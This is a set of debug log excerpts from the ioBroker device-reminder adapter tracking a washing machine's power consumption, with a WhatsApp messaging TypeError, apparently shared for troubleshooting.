14:12:51\\\",\\\"runtime\\\":\\\"00:27:30\\\"},{\\\"start\\\":\\\"13.07.2021 14:35:21\\\",\\\"end\\\":\\\"13.07.2021 15:56:21\\\",\\\"runtime\\\":\\\"01:20:50\\\"},{\\\"start\\\":\\\"13.07.2021 16:49:42\\\",\\\"end\\\":\\\"13.07.2021 18:16:32\\\",\\\"runtime\\\":\\\"01:26:40\\\"},{\\\"start\\\":\\\"13.07.2021 20:36:22\\\",\\\"end\\\":\\\"13.07.2021 22:08:13\\\",\\\"runtime\\\":\\\"01:31:40\\\"},{\\\"start\\\":\\\"13.07.2021 22:57:13\\\",\\\"end\\\":\\\"14.07.2021 00:05:43\\\",\\\"runtime\\\":\\\"01:08:20\\\"},{\\\"start\\\":\\\"14.07.2021 00:14:23\\\",\\\"end\\\":\\\"14.07.2021 00:23:03\\\",\\\"runtime\\\":\\\"00:08:30\\\"},{\\\"start\\\":\\\"14.07.2021 12:44:15\\\",\\\"end\\\":\\\"14.07.2021 14:34:06\\\",\\\"runtime\\\":\\\"01:49:40\\\"},{\\\"start\\\":\\\"14.07.2021 18:07:16\\\",\\\"end\\\":\\\"14.07.2021 18:41:36\\\",\\\"runtime\\\":\\\"00:34:10\\\"},{\\\"start\\\":\\\"14.07.2021 18:44:06\\\",\\\"end\\\":\\\"14.07.2021 19:19:26\\\",\\\"runtime\\\":\\\"00:35:10\\\"}]\"}}}\r\n2021-07-14 21:12:46.130 - debug: device-reminder.0 (2365838) [ID] \"device-reminder.0.Waschmaschine.config.do not disturb\"\r\n2021-07-14 21:12:46.130 - debug: device-reminder.0 (2365838) [PATH] {\"val\":false,\"ack\":true,\"ts\":1626289966120,\"q\":0,\"from\":\"system.adapter.device-reminder.0\",\"user\":\"system.user.admin\",\"lc\":1625063884606}\r\n2021-07-14 21:12:46.130 - debug: device-reminder.0 (2365838) [THIS.TRIGGER 482] {\"device-reminder.0.Waschmaschine.config.do not disturb\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.do not disturb\",\"target\":\"dnd\",\"type\":\"value\"},\"device-reminder.0.Waschmaschine.config.runtime max\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.runtime max\",\"target\":\"runtimeMax\",\"type\":\"value\"},\"alias.0.Waschmaschine.POWER\":{\"id\":\"0\",\"path\":\"alias.0.Waschmaschine.POWER\",\"target\":\"consumption\",\"type\":\"value\"}}\r\n2021-07-14 21:12:46.130 - debug: device-reminder.0 (2365838) TRIGGER {\"id\":\"0\",\"path\":\"Waschmaschine.config.do not disturb\",\"target\":\"dnd\",\"type\":\"value\"}\r\n2021-07-14 21:12:46.131 - debug: device-reminder.0 (2365838) THIS.VALUES {\"0\":{\"id\":\"0\",\"consumption\":{\"path\":\"alias.0.Waschmaschine.POWER\",\"val\":66.81,\"type\":\"number\"},\"switch\":{\"path\":\"\",\"val\":false,\"type\":\"boolean\"},\"dnd\":{\"path\":\"Waschmaschine.config.do not disturb\",\"val\":false,\"type\":\"boolean\"},\"runtimeMax\":{\"path\":\"Waschmaschine.config.runtime max\",\"val\":0,\"type\":\"number\"},\"dateJSON\":{\"path\":\"Waschmaschine.last operations\",\"val\":\"[{\\\"start\\\":\\\"11.07.2021 21:08:14\\\",\\\"end\\\":\\\"11.07.2021 22:37:24\\\",\\\"runtime\\\":\\\"01:29:00\\\"},{\\\"start\\\":\\\"12.07.2021 08:13:05\\\",\\\"end\\\":\\\"12.07.2021 09:40:56\\\",\\\"runtime\\\":\\\"01:27:40\\\"},{\\\"start\\\":\\\"12.07.2021 11:03:06\\\",\\\"end\\\":\\\"12.07.2021 12:33:36\\\",\\\"runtime\\\":\\\"01:30:20\\\"},{\\\"start\\\":\\\"13.07.2021 08:30:00\\\",\\\"end\\\":\\\"13.07.2021 09:58:50\\\",\\\"runtime\\\":\\\"01:28:40\\\"},{\\\"start\\\":\\\"13.07.2021 10:18:40\\\",\\\"end\\\":\\\"13.07.2021 11:46:11\\\",\\\"runtime\\\":\\\"01:27:20\\\"},{\\\"start\\\":\\\"13.07.2021 13:45:11\\\",\\\"end\\\":\\\"13.07.2021 14:12:51\\\",\\\"runtime\\\":\\\"00:27:30\\\"},{\\\"start\\\":\\\"13.07.2021 14:35:21\\\",\\\"end\\\":\\\"13.07.2021 15:56:21\\\",\\\"runtime\\\":\\\"01:20:50\\\"},{\\\"start\\\":\\\"13.07.2021 16:49:42\\\",\\\"end\\\":\\\"13.07.2021 18:16:32\\\",\\\"runtime\\\":\\\"01:26:40\\\"},{\\\"start\\\":\\\"13.07.2021 20:36:22\\\",\\\"end\\\":\\\"13.07.2021 22:08:13\\\",\\\"runtime\\\":\\\"01:31:40\\\"},{\\\"start\\\":\\\"13.07.2021 22:57:13\\\",\\\"end\\\":\\\"14.07.2021 00:05:43\\\",\\\"runtime\\\":\\\"01:08:20\\\"},{\\\"start\\\":\\\"14.07.2021 00:14:23\\\",\\\"end\\\":\\\"14.07.2021 00:23:03\\\",\\\"runtime\\\":\\\"00:08:30\\\"},{\\\"start\\\":\\\"14.07.2021 12:44:15\\\",\\\"end\\\":\\\"14.07.2021 14:34:06\\\",\\\"runtime\\\":\\\"01:49:40\\\"},{\\\"start\\\":\\\"14.07.2021 18:07:16\\\",\\\"end\\\":\\\"14.07.2021 18:41:36\\\",\\\"runtime\\\":\\\"00:34:10\\\"},{\\\"start\\\":\\\"14.07.2021 18:44:06\\\",\\\"end\\\":\\\"14.07.2021 19:19:26\\\",\\\"runtime\\\":\\\"00:35:10\\\"}]\"}}}\r\n2021-07-14 21:12:56.184 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:12:56.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:12:56.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:12:56.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 66.81\r\n2021-07-14 21:12:56.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 1, Inhalt: [66.81]\r\n2021-07-14 21:12:56.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n2021-07-14 21:12:56.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung beendet\r\n2021-07-14 21:12:56.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:12:56.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START66.81; 30; false\r\n2021-07-14 21:12:56.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n2021-07-14 21:13:06.184 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:13:06.184 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:13:06.184 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:13:06.184 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 66.81\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 2, Inhalt: [66.81,66.81]\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung beendet\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START66.81; 30; false\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n2021-07-14 21:13:07.654 - debug: device-reminder.0 (2365838) [ID] \"alias.0.Waschmaschine.POWER\"\r\n2021-07-14 21:13:07.654 - debug: device-reminder.0 (2365838) [PATH] {\"val\":68.72,\"ack\":true,\"ts\":1626289987645,\"q\":0,\"from\":\"system.adapter.hm-rpc.1\",\"user\":\"system.user.admin\",\"lc\":1626289987645}\r\n2021-07-14 21:13:07.654 - debug: device-reminder.0 (2365838) [THIS.TRIGGER 482] {\"device-reminder.0.Waschmaschine.config.do not disturb\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.do not disturb\",\"target\":\"dnd\",\"type\":\"value\"},\"device-reminder.0.Waschmaschine.config.runtime max\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.runtime max\",\"target\":\"runtimeMax\",\"type\":\"value\"},\"alias.0.Waschmaschine.POWER\":{\"id\":\"0\",\"path\":\"alias.0.Waschmaschine.POWER\",\"target\":\"consumption\",\"type\":\"value\"}}\r\n2021-07-14 21:13:07.654 - debug: device-reminder.0 (2365838) TRIGGER {\"id\":\"0\",\"path\":\"alias.0.Waschmaschine.POWER\",\"target\":\"consumption\",\"type\":\"value\"}\r\n2021-07-14 21:13:07.655 - debug: device-reminder.0 (2365838) THIS.VALUES {\"0\":{\"id\":\"0\",\"consumption\":{\"path\":\"alias.0.Waschmaschine.POWER\",\"val\":66.81,\"type\":\"number\"},\"switch\":{\"path\":\"\",\"val\":false,\"type\":\"boolean\"},\"dnd\":{\"path\":\"Waschmaschine.config.do not disturb\",\"val\":false,\"type\":\"boolean\"},\"runtimeMax\":{\"path\":\"Waschmaschine.config.runtime max\",\"val\":0,\"type\":\"number\"},\"dateJSON\":{\"path\":\"Waschmaschine.last operations\",\"val\":\"[{\\\"start\\\":\\\"11.07.2021 21:08:14\\\",\\\"end\\\":\\\"11.07.2021 22:37:24\\\",\\\"runtime\\\":\\\"01:29:00\\\"},{\\\"start\\\":\\\"12.07.2021 08:13:05\\\",\\\"end\\\":\\\"12.07.2021 09:40:56\\\",\\\"runtime\\\":\\\"01:27:40\\\"},{\\\"start\\\":\\\"12.07.2021 11:03:06\\\",\\\"end\\\":\\\"12.07.2021 12:33:36\\\",\\\"runtime\\\":\\\"01:30:20\\\"},{\\\"start\\\":\\\"13.07.2021 08:30:00\\\",\\\"end\\\":\\\"13.07.2021 09:58:50\\\",\\\"runtime\\\":\\\"01:28:40\\\"},{\\\"start\\\":\\\"13.07.2021 10:18:40\\\",\\\"end\\\":\\\"13.07.2021 11:46:11\\\",\\\"runtime\\\":\\\"01:27:20\\\"},{\\\"start\\\":\\\"13.07.2021 13:45:11\\\",\\\"end\\\":\\\"13.07.2021 14:12:51\\\",\\\"runtime\\\":\\\"00:27:30\\\"},{\\\"start\\\":\\\"13.07.2021 14:35:21\\\",\\\"end\\\":\\\"13.07.2021 15:56:21\\\",\\\"runtime\\\":\\\"01:20:50\\\"},{\\\"start\\\":\\\"13.07.2021 16:49:42\\\",\\\"end\\\":\\\"13.07.2021 18:16:32\\\",\\\"runtime\\\":\\\"01:26:40\\\"},{\\\"start\\\":\\\"13.07.2021 20:36:22\\\",\\\"end\\\":\\\"13.07.2021 22:08:13\\\",\\\"runtime\\\":\\\"01:31:40\\\"},{\\\"start\\\":\\\"13.07.2021 22:57:13\\\",\\\"end\\\":\\\"14.07.2021 00:05:43\\\",\\\"runtime\\\":\\\"01:08:20\\\"},{\\\"start\\\":\\\"14.07.2021 00:14:23\\\",\\\"end\\\":\\\"14.07.2021 00:23:03\\\",\\\"runtime\\\":\\\"00:08:30\\\"},{\\\"start\\\":\\\"14.07.2021 12:44:15\\\",\\\"end\\\":\\\"14.07.2021 14:34:06\\\",\\\"runtime\\\":\\\"01:49:40\\\"},{\\\"start\\\":\\\"14.07.2021 18:07:16\\\",\\\"end\\\":\\\"14.07.2021 18:41:36\\\",\\\"runtime\\\":\\\"00:34:10\\\"},{\\\"start\\\":\\\"14.07.2021 18:44:06\\\",\\\"end\\\":\\\"14.07.2021 19:19:26\\\",\\\"runtime\\\":\\\"00:35:10\\\"}]\r\n2021-07-14 21:13:16.184 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:13:16.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:13:16.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:13:16.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 67.45\r\n2021-07-14 21:13:16.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 3, Inhalt: [66.81,66.81,68.72]\r\n2021-07-14 21:13:16.188 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n2021-07-14 21:13:16.188 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung beendet\r\n2021-07-14 21:13:16.189 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:13:16.189 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START68.72; 30; false\r\n2021-07-14 21:13:16.190 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n2021-07-14 21:13:26.184 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:13:26.184 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:13:26.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:13:26.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 67.77\r\n2021-07-14 21:13:26.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 4, Inhalt: [66.81,66.81,68.72,68.72]\r\n2021-07-14 21:13:26.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n[Truncated]\n2021-07-14 21:13:26.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:13:26.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START68.72; 30; false\r\n2021-07-14 21:13:26.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n2021-07-14 21:13:36.185 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:13:36.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:13:36.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:13:36.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 67.96\r\n2021-07-14 21:13:36.188 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 5, Inhalt: [66.81,66.81,68.72,68.72,68.72]\r\n2021-07-14 21:13:36.189 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n2021-07-14 21:13:36.190 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung beendet\r\n2021-07-14 21:13:36.190 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:13:36.191 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START68.72; 30; false\r\n2021-07-14 21:13:36.193 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: value status: 1\r\n2021-07-14 21:13:36.194 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: in action (in action)\r\n2021-07-14 21:13:36.194 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Ger\u00e4t gestartet, device l\u00e4uft\r\n2021-07-14 21:13:36.195 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: GESTARTET\r\n2021-07-14 21:13:36.195 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: setVolume\r\n2021-07-14 21:13:36.308 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: setVolume\r\n2021-07-14 21:13:36.309 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n"
    },
    {
        "logs": "`[31merror\u001b[39m: device-reminder.0 (21495) [ERROR] {sendMsg: WHATSAPP}: \"TypeError: Cannot read property 'path' of undefined\" "
    },
    {
        "logs": "```\r\n2021-07-14 21:12:45.240 - info: host.gandalf instance system.adapter.device-reminder.0 started with pid 2365838\r\n2021-07-14 21:12:45.632 - debug: device-reminder.0 (2365838) Redis Objects: Use Redis connection: 127.0.0.1:9002\r\n2021-07-14 21:12:45.658 - debug: device-reminder.0 (2365838) Objects client ready ... initialize now\r\n2021-07-14 21:12:45.659 - debug: device-reminder.0 (2365838) Objects create System PubSub Client\r\n2021-07-14 21:12:45.662 - debug: device-reminder.0 (2365838) Objects create User PubSub Client\r\n2021-07-14 21:12:45.663 - debug: device-reminder.0 (2365838) Objects client initialize lua scripts\r\n2021-07-14 21:12:45.678 - debug: device-reminder.0 (2365838) Objects connected to redis: 127.0.0.1:9002\r\n2021-07-14 21:12:45.682 - debug: device-reminder.0 (2365838) objectDB connected\r\n2021-07-14 21:12:45.682 - debug: device-reminder.0 (2365838) Redis States: Use Redis connection: 127.0.0.1:9003\r\n2021-07-14 21:12:45.690 - debug: device-reminder.0 (2365838) States create System PubSub Client\r\n2021-07-14 21:12:45.690 - debug: device-reminder.0 (2365838) States create User PubSub Client\r\n2021-07-14 21:12:45.724 - debug: device-reminder.0 (2365838) States connected to redis: 127.0.0.1:9003\r\n2021-07-14 21:12:45.724 - debug: device-reminder.0 (2365838) statesDB connected\r\n2021-07-14 21:12:45.995 - info: device-reminder.0 (2365838) starting. Version 1.2.9 in /opt/iobroker/node_modules/iobroker.device-reminder, node: v14.2.0, js-controller: 3.3.14\r\n2021-07-14 21:12:46.013 - debug: device-reminder.0 (2365838) ARR INPUT devices {\"0\":{\"name\":\"Waschmaschine\",\"type\":\"Waschmaschine\",\"pathConsumption\":\"alias.0.Waschmaschine.POWER\",\"pathSwitch\":\"\",\"startText\":\"Waschmaschine gestartet\",\"endText\":\"Waschmaschine fertig\",\"enabled\":true,\"alexa\":[\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\"],\"whatsapp\":[\"0\",\"1\"],\"telegram\":[\"0\"],\"timer\":\"0\",\"autoOff\":false,\"abort\":true,\"id\":\"0\"}}\r\n2021-07-14 21:12:46.013 - debug: device-reminder.0 (2365838) ARR INPUT alexa {\"0\":{\"name\":\"K\u00fcche\",\"path\":\"alexa2.0.Echo-Devices.G000MW04742101CM.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"1\":{\"name\":\"HWR\",\"path\":\"alexa2.0.Echo-Devices.G2A0RF03745603R0.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"2\":{\"name\":\"Wohnzimmer\",\"path\":\"alexa2.0.Echo-Devices.G091AA0503920RSS.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"3\":{\"name\":\"Schlafzimmer\",\"path\":\"alexa2.0.Echo-Devices.G0913L060327017C.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"4\":{\"name\":\"Badezimmer EG\",\"path\":\"alexa2.0.Echo-Devices.G090LV03720203LR.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"5\":{\"name\":\"Badezimmer OG\",\"path\":\"alexa2.0.Echo-Devices.G0914704952305RU.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"6\":{\"name\":\"B\u00fcro\",\"path\":\"alexa2.0.Echo-Devices.G2A0RF03745603T7.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"}}\r\n2021-07-14 21:12:46.014 - debug: device-reminder.0 (2365838) ARR INPUT sayit {}\r\n2021-07-14 21:12:46.014 - debug: device-reminder.0 (2365838) ARR INPUT whatsapp {}\r\n2021-07-14 21:12:46.014 - debug: device-reminder.0 (2365838) ARR INPUT telegram {\"0\":{\"name\":\"Thorsten\",\"inst\":\".0\"}}\r\n2021-07-14 21:12:46.014 - debug: device-reminder.0 (2365838) ARR INPUT pushover {}\r\n2021-07-14 21:12:46.015 - debug: device-reminder.0 (2365838) ARR INPUT email {}\r\n2021-07-14 21:12:46.058 - debug: device-reminder.0 (2365838) RETURN {\"used\":false,\"startVal\":\"30\",\"endVal\":\"10\",\"standby\":\"1\",\"startCount\":\"5\",\"endCount\":\"10\"}\r\n2021-07-14 21:12:46.058 - debug: device-reminder.0 (2365838) OBJ IN CONSTRUCTOR: {\"name\":\"Waschmaschine\",\"type\":\"Waschmaschine\",\"pathConsumption\":\"alias.0.Waschmaschine.POWER\",\"pathSwitch\":\"\",\"startText\":\"Waschmaschine gestartet\",\"endText\":\"Waschmaschine fertig\",\"enabled\":true,\"alexa\":[\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\"],\"whatsapp\":[\"0\",\"1\"],\"telegram\":[\"0\"],\"timer\":\"0\",\"autoOff\":false,\"abort\":true,\"id\":\"0\"}\r\n2021-07-14 21:12:46.059 - debug: device-reminder.0 (2365838) RETURN {\"enabled\":true,\"name\":\"Waschmaschine\",\"type\":\"Waschmaschine\",\"currentConsumption\":\"alias.0.Waschmaschine.POWER\",\"switchPower\":\"\",\"pathStatus\":\"Waschmaschine.Status\",\"pathLiveConsumption\":\"Waschmaschine.live consumption\",\"timeTotal\":\"Waschmaschine.runtime\",\"timeTotalMs\":\"Waschmaschine.runtime in ms\",\"lastRuntime\":\"Waschmaschine.lastRuntime\",\"runtimeMaxDP\":\"Waschmaschine.config.runtime max\",\"alertRuntime\":\"Waschmaschine.alert runtime\",\"messageDP\":\"Waschmaschine.messageDP\",\"averageConsumption\":\"Waschmaschine.average consumption\",\"dnd\":\"Waschmaschine.config.do not disturb\",\"lastOperations\":\"Waschmaschine.last operations\",\"startTimeJSON\":\"00:00:00\",\"endtimeJSON\":\"00:00:00\",\"runtimeJSON\":\"00:00:00\",\"startMessageSent\":false,\"endMessageSent\":false,\"started\":false,\"abort\":true,\"autoOff\":false,\"consumption\":0,\"resultStart\":0,\"resultEnd\":0,\"resultStandby\":0,\"alertCounter\":0,\"startValue\":\"30\",\"endValue\":\"10\",\"standby\":\"1\",\"startCount\":\"5\",\"endCount\":\"10\",\"timeoutMsg\":null,\"startTime\":0,\"endTime\":0,\"arrStart\":[],\"arrEnd\":[],\"arrStandby\":[],\"dateJSON\":[],\"valCancel\":5,\"startMessageText\":\"Waschmaschine gestartet\",\"startMessage\":true,\"endMessageText\":\"Waschmaschine fertig\",\"endMessage\":true,\"timeout\":null,\"telegramUser\":[\"0\"],\"telegram\":true,\"alexaID\":[\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\"],\"alexaVolOld\":0,\"alexa\":true,\"sayIt\":false,\"whatsappID\":[\"0\",\"1\"],\"whatsapp\":true,\"pushover\":false,\"email\":false}\r\n2021-07-14 21:12:46.059 - info: device-reminder.0 (2365838) Device \"Waschmaschine\" was successfully created\r\n2021-07-14 21:12:46.060 - debug: device-reminder.0 (2365838) [SUBSCRIBE]: Waschmaschine.config.do not disturb: Waschmaschine.config.runtime max: alias.0.Waschmaschine.POWER:\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) [ID] \"device-reminder.0.Waschmaschine.config.runtime max\"\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) [PATH] {\"val\":0,\"ack\":true,\"ts\":1626289966120,\"q\":0,\"from\":\"system.adapter.device-reminder.0\",\"user\":\"system.user.admin\",\"lc\":1625063884595}\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) [THIS.TRIGGER 482] {\"device-reminder.0.Waschmaschine.config.do not disturb\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.do not disturb\",\"target\":\"dnd\",\"type\":\"value\"},\"device-reminder.0.Waschmaschine.config.runtime max\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.runtime max\",\"target\":\"runtimeMax\",\"type\":\"value\"},\"alias.0.Waschmaschine.POWER\":{\"id\":\"0\",\"path\":\"alias.0.Waschmaschine.POWER\",\"target\":\"consumption\",\"type\":\"value\"}}\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) TRIGGER {\"id\":\"0\",\"path\":\"Waschmaschine.config.runtime max\",\"target\":\"runtimeMax\",\"type\":\"value\"}\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) THIS.VALUES {\"0\":{\"id\":\"0\",\"consumption\":{\"path\":\"alias.0.Waschmaschine.POWER\",\"val\":66.81,\"type\":\"number\"},\"switch\":{\"path\":\"\",\"val\":false,\"type\":\"boolean\"},\"dnd\":{\"path\":\"Waschmaschine.config.do not disturb\",\"val\":false,\"type\":\"boolean\"},\"runtimeMax\":{\"path\":\"Waschmaschine.config.runtime max\",\"val\":0,\"type\":\"number\"},\"dateJSON\":{\"path\":\"Waschmaschine.last operations\",\"val\":\"[{\\\"start\\\":\\\"11.07.2021 21:08:14\\\",\\\"end\\\":\\\"11.07.2021 22:37:24\\\",\\\"runtime\\\":\\\"01:29:00\\\"},{\\\"start\\\":\\\"12.07.2021 08:13:05\\\",\\\"end\\\":\\\"12.07.2021 09:40:56\\\",\\\"runtime\\\":\\\"01:27:40\\\"},{\\\"start\\\":\\\"12.07.2021 11:03:06\\\",\\\"end\\\":\\\"12.07.2021 12:33:36\\\",\\\"runtime\\\":\\\"01:30:20\\\"},{\\\"start\\\":\\\"13.07.2021 08:30:00\\\",\\\"end\\\":\\\"13.07.2021 09:58:50\\\",\\\"runtime\\\":\\\"01:28:40\\\"},{\\\"start\\\":\\\"13.07.2021 10:18:40\\\",\\\"end\\\":\\\"13.07.2021 11:46:11\\\",\\\"runtime\\\":\\\"01:27:20\\\"},{\\\"start\\\":\\\"13.07.2021 13:45:11\\\",\\\"end\\\":\\\"13.07.2021 14:12:51\\\",\\\"runtime\\\":\\\"00:27:30\\\"},{\\\"start\\\":\\\"13.07.2021 14:35:21\\\",\\\"end\\\":\\\"13.07.2021 15:56:21\\\",\\\"runtime\\\":\\\"01:20:50\\\"},{\\\"start\\\":\\\"13.07.2021 16:49:42\\\",\\\"end\\\":\\\"13.07.2021 18:16:32\\\",\\\"runtime\\\":\\\"01:26:40\\\"},{\\\"start\\\":\\\"13.07.2021 20:36:22\\\",\\\"end\\\":\\\"13.07.2021 22:08:13\\\",\\\"runtime\\\":\\\"01:31:40\\\"},{\\\"start\\\":\\\"13.07.2021 22:57:13\\\",\\\"end\\\":\\\"14.07.2021 00:05:43\\\",\\\"runtime\\\":\\\"01:08:20\\\"},{\\\"start\\\":\\\"14.07.2021 00:14:23\\\",\\\"end\\\":\\\"14.07.2021 00:23:03\\\",\\\"runtime\\\":\\\"00:08:30\\\"},{\\\"start\\\":\\\"14.07.2021 12:44:15\\\",\\\"end\\\":\\\"14.07.2021 14:34:06\\\",\\\"runtime\\\":\\\"01:49:40\\\"},{\\\"start\\\":\\\"14.07.2021 18:07:16\\\",\\\"end\\\":\\\"14.07.2021 18:41:36\\\",\\\"runtime\\\":\\\"00:34:10\\\"},{\\\"start\\\":\\\"14.07.2021 18:44:06\\\",\\\"end\\\":\\\"14.07.2021 19:19:26\\\",\\\"runtime\\\":\\\"00:35:10\\\"}]\"}}}\r\n2021-07-14 21:12:46.130 - debug: device-reminder.0 (2365838) [ID] \"device-reminder.0.Waschmaschine.config.do not disturb\"\r\n2021-07-14 21:12:46.130 - debug: device-reminder.0 (2365838) [PATH] {\"val\":false,\"ack\":true,\"ts\":1626289966120,\"q\":0,\"from\":\"system.adapter.device-reminder.0\",\"user\":\"system.user.admin\",\"lc\":1625063884606}\r\n2021-07-14 21:12:46.130 - debug: device-reminder.0 (2365838) [THIS.TRIGGER 482] {\"device-reminder.0.Waschmaschine.config.do not disturb\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.do not disturb\",\"target\":\"dnd\",\"type\":\"value\"},\"device-reminder.0.Waschmaschine.config.runtime max\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.runtime max\",\"target\":\"runtimeMax\",\"type\":\"value\"},\"alias.0.Waschmaschine.POWER\":{\"id\":\"0\",\"path\":\"alias.0.Waschmaschine.POWER\",\"target\":\"consumption\",\"type\":\"value\"}}\r\n2021-07-14 21:12:46.130 - debug: device-reminder.0 (2365838) TRIGGER {\"id\":\"0\",\"path\":\"Waschmaschine.config.do not disturb\",\"target\":\"dnd\",\"type\":\"value\"}\r\n2021-07-14 21:12:46.131 - debug: device-reminder.0 (2365838) THIS.VALUES {\"0\":{\"id\":\"0\",\"consumption\":{\"path\":\"alias.0.Waschmaschine.POWER\",\"val\":66.81,\"type\":\"number\"},\"switch\":{\"path\":\"\",\"val\":false,\"type\":\"boolean\"},\"dnd\":{\"path\":\"Waschmaschine.config.do not disturb\",\"val\":false,\"type\":\"boolean\"},\"runtimeMax\":{\"path\":\"Waschmaschine.config.runtime max\",\"val\":0,\"type\":\"number\"},\"dateJSON\":{\"path\":\"Waschmaschine.last operations\",\"val\":\"[{\\\"start\\\":\\\"11.07.2021 21:08:14\\\",\\\"end\\\":\\\"11.07.2021 